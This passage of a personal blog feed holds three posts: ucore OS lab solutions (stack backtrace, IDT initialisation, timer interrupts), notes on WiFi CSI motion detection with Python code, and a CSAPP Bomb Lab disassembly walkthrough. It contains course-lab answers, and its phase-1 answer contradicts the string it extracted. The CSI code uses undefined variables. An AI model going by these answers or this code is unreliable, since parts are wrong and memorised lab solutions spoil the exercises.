j;</div><div class="line">    for(i = 0; ebp != 0 &amp;&amp; i &lt; STACKFRAME_DEPTH; i++)</div><div class="line">    &#123;</div><div class="line">        cprintf(&quot;epb:0x%08x eip:0x%08x args:&quot;, ebp, eip);</div><div class="line">        uint32_t *args = (uint32_t *)ebp + 2;</div><div class="line">        for (j = 0; j &lt; 4; j++)</div><div class="line">        &#123;</div><div class="line">            cprintf(&quot;0x%08x &quot;, args[j]);</div><div class="line">        &#125;</div><div class="line">        cprintf(&quot;\n&quot;);</div><div class="line">        print_debuginfo(eip - 1);</div><div class="line">        eip = ((uint32_t *)ebp)[1];</div><div class="line">        ebp = ((uint32_t *)ebp)[0];</div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>提示还是挺详细的，按照提示一步步写就能写出。首先读取ebp和eip的值，然后将堆栈里的信息打印出来，之后移动eip和ebp。</p>
<h3 id="u7EC3_u4E606"><a href="#u7EC3_u4E606" class="headerlink" title="练习6"></a>练习6</h3><p>1.中断描述符表（也可简称为保护模式下的中断向量表）中一个表项占多少字节？其中哪几位代表中断处理代码的入口？</p>
<p>通过查看/kern/mm/mmh.h,将struct gatedesc中元素的位相加，共64bit也就是8个字节。另外低16bit和高16bit为段偏移量，查看这个<a href="http://wiki.osdev.org/Interrupt_Descriptor_Table" target="_blank" rel="external">资料</a>,可以知道段选择子是16bit。</p>
<table>
<thead>
<tr>
<th>Name</th>
<th style="text-align:center">Bit</th>
<th style="text-align:left">Full Name</th>
</tr>
</thead>
<tbody>
<tr>
<td>Offset</td>
<td style="text-align:center">48..63</td>
<td style="text-align:left">Offset 16..31</td>
</tr>
<tr>
<td>P</td>
<td style="text-align:center">47</td>
<td style="text-align:left">Present</td>
</tr>
<tr>
<td>DPL</td>
<td style="text-align:center">45,46</td>
<td style="text-align:left">Descriptor Privilege Level</td>
</tr>
<tr>
<td>S</td>
<td style="text-align:center">44</td>
<td style="text-align:left">Storage Segment</td>
</tr>
<tr>
<td>Type</td>
<td style="text-align:center">40..43</td>
<td style="text-align:left">Gate Type 0..3</td>
</tr>
<tr>
<td>0</td>
<td style="text-align:center">32..39</td>
<td style="text-align:left">Unused 0..7</td>
</tr>
<tr>
<td>Selector</td>
<td style="text-align:center">16..31</td>
<td style="text-align:left">Selector 0..15</td>
</tr>
<tr>
<td>Offset</td>
<td style="text-align:center">0..15</td>
<td style="text-align:left">Offset 0..15</td>
</tr>
</tbody>
</table>
<p>2.请编程完善kern/trap/trap.c中对中断向量表进行初始化的函数idt_init。在idt_init函数中，依次对所有中断入口进行初始化。使用mmu.h中的SETGATE宏，填充idt数组内容。每个中断的入口由tools/vectors.c生成，使用trap.c中声明的vectors数组即可。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/* idt_init - initialize IDT to each of the entry points in kern/trap/vectors.S */</span></div><div class="line"><span class="function"><span class="keyword">void</span></span></div><div class="line"><span class="title">idt_init</span><span class="params">(<span class="keyword">void</span>)</span> &#123;</div><div class="line">     <span class="comment">/* LAB1 YOUR CODE : STEP 2 */</span></div><div class="line">     <span class="comment">/* (1) Where are the entry addrs of each Interrupt Service Routine (ISR)?</span></div><div class="line">      *     All ISR's entry addrs are stored in __vectors. where is uintptr_t __vectors[] ?</div><div class="line">      *     __vectors[] is in kern/trap/vector.S which is produced by tools/vector.c</div><div class="line">      *     (try "make" command in lab1, then you will find vector.S in kern/trap DIR)</div><div class="line">      *     You can use  "extern uintptr_t __vectors[];" to define this extern variable which will be used later.</div><div class="line">      * (2) Now you should setup the entries of ISR in Interrupt Description Table (IDT).</div><div class="line">      *     Can you see idt[256] in this file? Yes, it's IDT! you can use SETGATE macro to setup each item of IDT</div><div class="line">      * (3) After setup the contents of IDT, you will let CPU know where is the IDT by using 'lidt' instruction.</div><div class="line">      *     You don't know the meaning of this instruction? just google it! and check the libs/x86.h to know more.</div><div class="line">      *     Notice: the argument of lidt is idt_pd. try to find it!</div><div class="line">      */</div><div class="line">    <span class="keyword">extern</span> <span class="keyword">uintptr_t</span> __vectors[];</div><div class="line">    <span class="keyword">int</span> i;</div><div class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(idt) / <span class="keyword">sizeof</span>(<span class="keyword">struct</span> gatedesc); i ++) &#123;</div><div class="line">        SETGATE(idt[i], <span class="number">0</span>, GD_KTEXT, __vectors[i], DPL_KERNEL);</div><div class="line">    &#125;</div><div class="line">	<span class="comment">// set for switch from user to kernel</span></div><div class="line">    SETGATE(idt[T_SWITCH_TOK], <span class="number">0</span>, GD_KTEXT, __vectors[T_SWITCH_TOK], DPL_USER);</div><div class="line">	<span class="comment">// load the IDT</span></div><div class="line">    lidt(&amp;idt_pd);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>3.请编程完善trap.c中的中断处理函数trap，在对时钟中断进行处理的部分填写trap函数中处理时钟中断的部分，使操作系统每遇到100次时钟中断后，调用print_ticks子程序，向屏幕上打印一行文字”100 ticks”。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">case</span> IRQ_OFFSET + IRQ_TIMER:</div><div class="line">        <span class="comment">/* LAB1 YOUR CODE : STEP 3 */</span></div><div class="line">        <span class="comment">/* handle the timer interrupt */</span></div><div class="line">        <span class="comment">/* (1) After a timer interrupt, you should record this event using a global variable (increase it), such as ticks in kern/driver/clock.c</span></div><div class="line">         * (2) Every TICK_NUM cycle, you can print some info using a funciton, such as print_ticks().</div><div class="line">         * (3) Too Simple? Yes, I think so!</div><div class="line">         */</div><div class="line">        ticks ++;</div><div class="line">        <span class="keyword">if</span> (ticks % TICK_NUM == <span class="number">0</span>) &#123;</div><div class="line">            print_ticks();</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">break</span>;</div></pre></td></tr></table></figure>
<p>To be continued.</p>
]]></content>
    
    <summary type="html">
    
      ucore
    
    </summary>
    
    
      <category term="os" scheme="http://xinqiu.me/tags/os/"/>
    
  </entry>
  
  <entry>
    <title>基于CSI的移动目标侦测研究学习</title>
    <link href="http://xinqiu.me/2016/03/12/csi-start/"/>
    <id>http://xinqiu.me/2016/03/12/csi-start/</id>
    <published>2016-03-11T16:00:00.000Z</published>
    <updated>2016-03-12T01:41:28.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote>
<p>最近被老师带着搞科研，研究CSI(channel state information)。</p>
</blockquote>
<h2 id="u73AF_u5883_u5B89_u88C5"><a href="#u73AF_u5883_u5B89_u88C5" class="headerlink" title="环境安装"></a>环境安装</h2><p>需要用到<a href="http://dhalperi.github.io/linux-80211n-csitool/" target="_blank" rel="external">CSI tool</a>，这是一个运行在Ubuntu上的利用Intel Wi-Fi Wireless Link 5300 802.11n来做分析的程序。这里可以使用作者网站中方法来安装，也可以下载<a href="http://pan.baidu.com/s/1dDhFuNJ" target="_blank" rel="external">清华的版本</a>。清华的版本附带了安装说明书，参考说明书上的方法，安装即可。</p>
<p>需要注意的是，发射源路由器需要选择单天线支持802.11n的路由器，我使用的是TP-LINK TL-WR742N。</p>
<h2 id="u83B7_u53D6_u6570_u636E"><a href="#u83B7_u53D6_u6570_u636E" class="headerlink" title="获取数据"></a>获取数据</h2><p>cd进入csitools文件夹，进入linux-80211n-csitool-supplementary/netlink，运行</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo ./log_to_file tmp.dat</div></pre></td></tr></table></figure>
<p>打开另一个终端，运行</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ping 192.168.1.1 -i 0.2</div></pre></td></tr></table></figure>
<p>netlink文件夹中的tmp.dat就是采集的原始数据。</p>
<h2 id="u8BFB_u53D6_u6570_u636E"><a href="#u8BFB_u53D6_u6570_u636E" class="headerlink" title="读取数据"></a>读取数据</h2><p>使用Matlab读取数据，进入linux-80211n-csitool-supplementary/matlab文件夹，使用read_bf_file函数可以读取数据。</p>
<p>一个例子数据包里包含</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">timestamp_low: 4            (In the sample trace, timestamp_low is invalid and always 4.)</div><div class="line">       bfee_count: 72</div><div class="line">              Nrx: 3</div><div class="line">              Ntx: 1</div><div class="line">           rssi_a: 33</div><div class="line">           rssi_b: 37</div><div class="line">           rssi_c: 41</div><div class="line">            noise: -127</div><div class="line">              agc: 38</div><div class="line">             perm: [3 2 1]</div><div class="line">             rate: 256</div><div class="line">              csi: [1x3x30 double]</div></pre></td></tr></table></figure>
<p>其中:</p>
<ul>
<li><strong><strong>timestamp_low</strong></strong> 是时间戳</li>
<li><strong><strong>bfee_count</strong></strong> 数据包数量</li>
<li><strong><strong>Nrx,Ntx</strong></strong> 分别表示接收端和发送端的天线数量</li>
<li><strong><strong>rssi_a, rssi_b, rssi_c</strong></strong> 每个天线的RSSI数据，单位dB，</li>
<li><strong><strong>agc</strong></strong> Automatic Gain Control</li>
<li><strong><strong>perm</strong></strong> NIC重排列后的顺序结果，代表RF链路的顺序</li>
<li><strong><strong>rate</strong></strong> 发送包的rate</li>
<li><strong><strong>csi</strong></strong> CSI原始数据，是个Ntx×Nrx×30复数矩阵</li>
</ul>
<p>主要提取出CSI数据和timestamp_low。</p>
<a id="more"></a>
<h2 id="u6570_u636E_u9884_u5904_u7406"><a href="#u6570_u636E_u9884_u5904_u7406" class="headerlink" title="数据预处理"></a>数据预处理</h2><p>为了避免相位的偏移的影响，需要将相位进行线性变换，参考论文，写出了以下Python代码:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> math <span class="keyword">import</span> *</div><div class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</div><div class="line"><span class="keyword">import</span> copy</div><div class="line"></div><div class="line">N = <span class="number">1000</span> <span class="comment"># N为采集的数据包数量</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">complexDecoding</span><span class="params">(raw_data)</span>:</span></div><div class="line">	<span class="string">"""	</span></div><div class="line">	将原始数据转化为Python可识别的复数</div><div class="line">	这里使用了第一个天线的数据raw_data[0]</div><div class="line">	第二根第三根天线数据下标分别为1, 2</div><div class="line">	原始数据为a + bi, python为a + bj</div><div class="line">	返回处理后的数据</div><div class="line">	"""</div><div class="line">	<span class="keyword">for</span> n <span class="keyword">in</span> range(N):</div><div class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">30</span>): <span class="comment"># 30 代表子载波数量，固定为30</span></div><div class="line">			<span class="keyword">if</span> raw_data[<span class="number">0</span>][<span class="number">-1</span>] == <span class="string">'i'</span>:</div><div class="line">            	data.append(complex(raw_data[<span class="number">0</span>][:<span class="number">-1</span>]+<span class="string">'j'</span>))</div><div class="line">        	<span class="keyword">else</span>:</div><div class="line">            	data.append(complex(raw_data[<span class="number">0</span>]))</div><div class="line">    <span class="keyword">return</span> data</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getAP</span><span class="params">(data)</span>:</span></div><div class="line">	<span class="string">"""</span></div><div class="line">	根据复数计算振幅和相位</div><div class="line">	"""</div><div class="line">	amplitudes = [([] * <span class="number">30</span>) <span class="keyword">for</span> i <span class="keyword">in</span> range(N)]</div><div class="line">	phases = [([] * <span class="number">30</span>) <span class="keyword">for</span> i <span class="keyword">in</span> range(N)]</div><div class="line">	<span class="keyword">for</span> m <span class="keyword">in</span> range(N):</div><div class="line">	    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">30</span>):</div><div class="line">	        r = sqrt((data[i + m * <span class="number">30</span>].real) ** <span class="number">2</span> + (data[i + m * <span class="number">30</span>].imag) ** <span class="number">2</span>)</div><div class="line">	        amplitudes[m].append(r)</div><div class="line">	        phases[m].append(np.angle(data[i + m * <span class="number">30</span>]))</div><div class="line">	<span class="keyword">return</span> (amplitudes, phases)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">preprocessingPhase</span><span class="params">(phases)</span>:</span></div><div class="line">	<span class="string">"""</span></div><div class="line">	将相位进行线性变换</div><div class="line">	index是 -28 到 28 根据 IEEE 802.11n 协议</div><div class="line">	返回变换后的相位</div><div class="line">	"""</div><div class="line">	index = range(<span class="number">-28</span>,<span class="number">0</span>,<span class="number">2</span>) + [<span class="number">-1</span>, <span class="number">1</span>] + range(<span class="number">3</span>,<span class="number">28</span>, <span class="number">2</span>) + [<span class="number">28</span>]</div><div class="line">	<span class="keyword">for</span> m <span class="keyword">in</span> range(N):</div><div class="line">	    <span class="keyword">for</span> l <span class="keyword">in</span> range(<span class="number">10</span>):</div><div class="line">	        clear = <span class="keyword">True</span></div><div class="line">	        base = <span class="number">0</span></div><div class="line">	        tphases[m][<span class="number">0</span>] = phases[m][<span class="number">0</span>]</div><div class="line"></div><div class="line">	        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">30</span>):</div><div class="line">	            <span class="keyword">if</span> phases[m][i] - phases[m][i<span class="number">-1</span>] &gt; pi:</div><div class="line">	                base += <span class="number">1</span></div><div class="line">	                clear = <span class="keyword">False</span></div><div class="line">	            <span class="keyword">elif</span> phases[m][i] - phases[m][i<span class="number">-1</span>] &lt; -pi:</div><div class="line">	                base -= <span class="number">1</span></div><div class="line">	                clear = <span class="keyword">False</span></div><div class="line">	            tphases[m][i] = phases[m][i] - <span class="number">2</span> * pi * base</div><div class="line"></div><div class="line">	        <span class="keyword">if</span> clear == <span class="keyword">True</span>:</div><div class="line">	            <span class="keyword">break</span></div><div class="line">	        <span class="keyword">else</span>:</div><div class="line">	            <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">30</span>):</div><div class="line">	                phases[m][i] = tphases[m][i] - (tphases[m][<span class="number">29</span>] - tphases[m][<span class="number">0</span>]) </div><div class="line">	                				* <span class="number">1.0</span> /(<span class="number">28</span> - (<span class="number">-28</span>)) * (index[i]) </div><div class="line">	                				- <span class="number">1.0</span> / <span class="number">30</span> * sum([tphases[m][j] <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">30</span>)])</div><div class="line">	<span class="keyword">return</span> phases</div></pre></td></tr></table></figure>
<h2 id="u53C2_u8003_u8BBA_u6587"><a href="#u53C2_u8003_u8BBA_u6587" class="headerlink" title="参考论文"></a>参考论文</h2><ol>
<li>PADS Passive Detection of Moving Targets with Dynamic Speed using PHY Layer Information</li>
</ol>
]]></content>
    
    <summary type="html">
    
      csi
    
    </summary>
    
    
      <category term="csi" scheme="http://xinqiu.me/tags/csi/"/>
    
  </entry>
  
  <entry>
    <title>CSAPP Lab2 解题分析</title>
    <link href="http://xinqiu.me/2016/02/10/csapp-lab2-bomb/"/>
    <id>http://xinqiu.me/2016/02/10/csapp-lab2-bomb/</id>
    <published>2016-02-09T16:00:00.000Z</published>
    <updated>2016-02-12T13:53:56.000Z</updated>
    
    <content type="html"><![CDATA[<p>Lab2 的 Bomb是个非常有意思的实验，比起之前耗脑的Lab1，这个Lab主要是学习反汇编。</p>
<p>这里我的环境是OS X EI Capitan，Lab2是[Updated 1/12/16].</p>
<!--toc-->
<h2 id="Phase1"><a href="#Phase1" class="headerlink" title="Phase1"></a>Phase1</h2><p>在Mac上是默认没有GDB的，可以使用LLDB来代替。</p>
<p>进入lldb</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">lldb bomb</div></pre></td></tr></table></figure>
<p>使用<code>disassemble</code>进行反汇编,参考<code>bomb.c</code>文件，可以知道主要的几个函数名。</p>
<p>首先是Phase_1</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">(lldb) disas -n phase_1</div></pre></td></tr></table></figure>
<p>得到以下汇编代码</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">bomb`phase_1:</div><div class="line">bomb[0x400ee0] <span class="tag">&lt;<span class="name">+0</span>&gt;</span>:  subq   $0x8, %rsp</div><div class="line">bomb[0x400ee4] <span class="tag">&lt;<span class="name">+4</span>&gt;</span>:  movl   $0x402400, %esi</div><div class="line">bomb[0x400ee9] <span class="tag">&lt;<span class="name">+9</span>&gt;</span>:  callq  0x401338                  ; strings_not_equal</div><div class="line">bomb[0x400eee] <span class="tag">&lt;<span class="name">+14</span>&gt;</span>: testl  %eax, %eax</div><div class="line">bomb[0x400ef0] <span class="tag">&lt;<span class="name">+16</span>&gt;</span>: je     0x400ef7                  ; <span class="tag">&lt;<span class="name">+23</span>&gt;</span></div><div class="line">bomb[0x400ef2] <span class="tag">&lt;<span class="name">+18</span>&gt;</span>: callq  0x40143a                  ; explode_bomb</div><div class="line">bomb[0x400ef7] <span class="tag">&lt;<span class="name">+23</span>&gt;</span>: addq   $0x8, %rsp</div><div class="line">bomb[0x400efb] <span class="tag">&lt;<span class="name">+27</span>&gt;</span>: retq</div></pre></td></tr></table></figure>
<p>这段代码还是挺好理解的，保存<code>Stack pointer</code>,将<code>$0x402400</code>传给<code>%esi</code>,调用位于<code>0x401338</code>的<code>strings_not_equal</code>函数，比较<code>%eax</code>是否为0，不为零则调用<code>explode_bomb</code>函数，为零则返回。</p>
<p>所以关键要找出字符串是什么。根据上述的汇编代码，可以发现字符串被保存在<code>0x402400</code>这个内存里，所以使用<code>x/s</code>来查看。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">(lldb) x/s 0x402400</div></pre></td></tr></table></figure>
<p>得到</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">0x00402400: "Border relations with Canada have never been better."</div></pre></td></tr></table></figure>
<p>所以第一关的答案是<code>Strings_Not_Equal</code></p>
<a id="more"></a>
<h2 id="Phase2"><a href="#Phase2" class="headerlink" title="Phase2"></a>Phase2</h2><p>同样，还是先反汇编出代码</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">bomb`phase_2:</div><div class="line">bomb[0x400efc] <span class="tag">&lt;<span class="name">+0</span>&gt;</span>:  pushq  %rbp</div><div class="line">bomb[0x400efd] <span class="tag">&lt;<span class="name">+1</span>&gt;</span>:  pushq  %rbx</div><div class="line">bomb[0x400efe] <span class="tag">&lt;<span class="name">+2</span>&gt;</span>:  subq   $0x28, %rsp</div><div class="line">bomb[0x400f02] <span class="tag">&lt;<span class="name">+6</span>&gt;</span>:  movq   %rsp, %rsi</div><div class="line">bomb[0x400f05] <span class="tag">&lt;<span class="name">+9</span>&gt;</span>:  callq  0x40145c                  ; read_six_numbers</div><div class="line">bomb[0x400f0a] <span class="tag">&lt;<span class="name">+14</span>&gt;</span>: cmpl   $0x1, (%rsp)</div><div class="line">bomb[0x400f0e] <span class="tag">&lt;<span class="name">+18</span>&gt;</span>: je     0x400f30                  ; <span class="tag">&lt;<span class="name">+52</span>&gt;</span></div><div class="line">bomb[0x400f10] <span class="tag">&lt;<span class="name">+20</span>&gt;</span>: callq  0x40143a                  ; explode_bomb</div><div class="line">bomb[0x400f15] <span class="tag">&lt;<span class="name">+25</span>&gt;</span>: jmp    0x400f30                  ; <span class="tag">&lt;<span class="name">+52</span>&gt;</span></div><div class="line">bomb[0x400f17] <span class="tag">&lt;<span class="name">+27</span>&gt;</span>: movl   -0x4(%rbx), %eax</div><div class="line">bomb[0x400f1a] <span class="tag">&lt;<span class="name">+30</span>&gt;</span>: addl   %eax, %eax</div><div class="line">bomb[0x400f1c] <span class="tag">&lt;<span class="name">+32</span>&gt;</span>: cmpl   %eax, (%rbx)</div><div class="line">bomb[0x400f1e] <span class="tag">&lt;<span class="name">+34</span>&gt;</span>: je     0x400f25                  ; <span class="tag">&lt;<span class="name">+41</span>&gt;</span></div><div class="line">bomb[0x400f20] <span class="tag">&lt;<span class="name">+36</span>&gt;</span>: callq  0x40143a                  ; explode_bomb</div><div class="line">bomb[0x400f25] <span class="tag">&lt;<span class="name">+41</span>&gt;</span>: addq   $0x4, %rbx</div><div class="line">bomb[0x400f29] <span class="tag">&lt;<span class="name">+45</span>&gt;</span>: cmpq   %rbp, %rbx</div><div class="line">bomb[0x400f2c] <span class="tag">&lt;<span class="name">+48</span>&gt;</span>: jne    0x400f17                  ; <span class="tag">&lt;<span class="name">+27</span>&gt;</span></div><div class="line">bomb[0x400f2e] <span class="tag">&lt;<span class="name">+50</span>&gt;</span>: jmp    0x400f3c                  ; <span class="tag">&lt;<span class="name">+64</span>&gt;</span></div><div class="line">bomb[0x400f30] <span class="tag">&lt;<span class="name">+52</span>&gt;</span>: leaq   0x4(%rsp), %rbx</div><div class="line">bomb[0x400f35] <span class="tag">&lt;<span class="name">+57</span>&gt;</span>: leaq   0x18(%rsp), %rbp</div><div class="line">bomb[0x400f3a] <span class="tag">&lt;<span class="name">+62</span>&gt;</span>: jmp    0x400f17                  ; <span class="tag">&lt;<span class="name">+27</span>&gt;</span></div><div class="line">bomb[0x400f3c] <span class="tag">&lt;<span class="name">+64</span>&gt;</span>: addq   $0x28, %rsp</div><div class="line">bomb[0x400f40] <span class="tag">&lt;<span class="name">+68</span>&gt;</span>: popq   %rbx</div><div class="line">bomb[0x400f41] <span class="tag">&lt;<span class="name">+69</span>&gt;</span>: popq   %rbp</div><div class="line">bomb[0x400f42] <span class="tag">&lt;<span class="name">+70</span>&gt;</span>: retq</div></pre></td></tr></table></figure>
<p>从上述汇编中，可以发现从%rsp位置开始保存数字。</p>
<p>反汇编<code>read_six_numbers</code>得到</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">bomb`read_six_numbers:</div><div class="line">bomb[0x40145c] <span class="tag">&lt;<span class="name">+0</span>&gt;</span>:  subq   $0x18, %rsp</div><div class="line">bomb[0x401460] <span class="tag">&lt;<span class="name">+4</span>&gt;</span>:  movq   %rsi, %rdx</div><div class="line">bomb[0x401463] <span class="tag">&lt;<span class="name">+7</span>&gt;</span>:  leaq   0x4(%rsi), %rcx</div><div class="line">bomb[0x401467] <span class="tag">&lt;<span class="name">+11</span>&gt;</span>: leaq   0x14(%rsi), %rax</div><div class="line">bomb[0x40146b] <span class="tag">&lt;<span class="name">+15</span>&gt;</span>: movq   %rax, 0x8(%rsp)</div><div class="line">bomb[0x401470] <span class="tag">&lt;<span class="name">+20</span>&gt;</span>: leaq   0x10(%rsi), %rax</div><div class="line">bomb[0x401474] <span class="tag">&lt;<span class="name">+24</span>&gt;</span>: movq   %rax, (%rsp)</div><div class="line">bomb[0x401478] <span class="tag">&lt;<span class="name">+28</span>&gt;</span>: leaq   0xc(%rsi), %r9</div><div class="line">bomb[0x40147c] <span class="tag">&lt;<span class="name">+32</span>&gt;</span>: leaq   0x8(%rsi), %r8</div><div class="line">bomb[0x401480] <span class="tag">&lt;<span class="name">+36</span>&gt;</span>: movl   $0x4025c3, %esi</div><div class="line">bomb[0x401485] <span class="tag">&lt;<span class="name">+41</span>&gt;</span>: movl   $0x0, %eax</div><div class="line">bomb[0x40148a] <span class="tag">&lt;<span class="name">+46</span>&gt;</span>: callq  0x400bf0                  ; symbol stub for: __isoc99_sscanf</div><div class="line">bomb[0x40148f] <span class="tag">&lt;<span class="name">+51</span>&gt;</span>: cmpl   $0x5, %eax</div><div class="line">bomb[0x401492] <span class="tag">&lt;<span class="name">+54</span>&gt;</span>: jg     0x401499                  ; <span class="tag">&lt;<span class="name">+61</span>&gt;</span></div><div class="line">bomb[0x401494] <span class="tag">&lt;<span class="name">+56</span>&gt;</span>: callq  0x40143a                  ; explode_bomb</div><div class="line">bomb[0x401499] <span class="tag">&lt;<span class="name">+61</span>&gt;</span>: addq   $0x18, %rsp</div><div class="line">bomb[0x40149d] <span class="tag">&lt;<span class="name">+65</span>&gt;</span>: retq</div></pre></td></tr></table></figure>
<p>根据Phase1,很敏感的会发现<code>movl   $0x4025c3, %esi</code>这行。通过之前一样的方法，得到<code>0x4025c3</code>内存里的字符串，</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">0x004025c3: "%d %d %d %d %d %d"</div></pre></td></tr></table></figure>
<p>再根据<code>bomb[0x40148a] &lt;+46&gt;: callq  0x400bf0                  ; symbol stub for: __isoc99_sscanf</code>这句，猜一下，立马就能联想到<code>scanf(&quot;%d %d %d %d %d %d&quot;,a,b,c,d,e,f);</code>，也就是说，输入的格式已经确定了。</p>
<p><code>bomb[0x40145c] &lt;+0&gt;:  subq   $0x18, %rsp</code>这行也暗示了之前<code>bomb[0x400f35] &lt;+57&gt;: leaq   0x18(%rsp), %rbp</code>为什么是0x18(%rsp)。</p>
<p>回到<code>phase_2</code>，根据<code>cmpl   $0x1, (%rsp)</code>和下一行汇编语句，很容易知道第一个数是1.<br>接着跳到了<code>&lt;+52&gt;</code>,将0x4(%rsp)指向内存里的值传给%rbx,将0x18(%rsp)指向内存里的值传给%rbp。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">bomb[0x400f17] <span class="tag">&lt;<span class="name">+27</span>&gt;</span>: movl   -0x4(%rbx), %eax</div><div class="line">bomb[0x400f1a] <span class="tag">&lt;<span class="name">+30</span>&gt;</span>: addl   %eax, %eax</div><div class="line">bomb[0x400f1c] <span class="tag">&lt;<span class="name">+32</span>&gt;</span>: cmpl   %eax, (%rbx)</div><div class="line">bomb[0x400f1e] <span class="tag">&lt;<span class="name">+34</span>&gt;</span>: je     0x400f25</div></pre></td></tr></table></figure>
<p>这段代码是循环里的部分</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">bomb[0x400f25] <span class="tag">&lt;<span class="name">+41</span>&gt;</span>: addq   $0x4, %rbx</div><div class="line">bomb[0x400f29] <span class="tag">&lt;<span class="name">+45</span>&gt;</span>: cmpq   %rbp, %rbx</div><div class="line">bomb[0x400f2c] <span class="tag">&lt;<span class="name">+48</span>&gt;</span>: jne    0x400f17                  ; <span class="tag">&lt;<span class="name">+27</span>&gt;</span></div><div class="line">bomb[0x400f2e] <span class="tag">&lt;<span class="name">+50</span>&gt;</span>: jmp    0x400f3c                  ; <span class="tag">&lt;<span class="name">+64</span>&gt;</span></div></pre></td></tr></table></figure>
<p>这是循环条件</p>
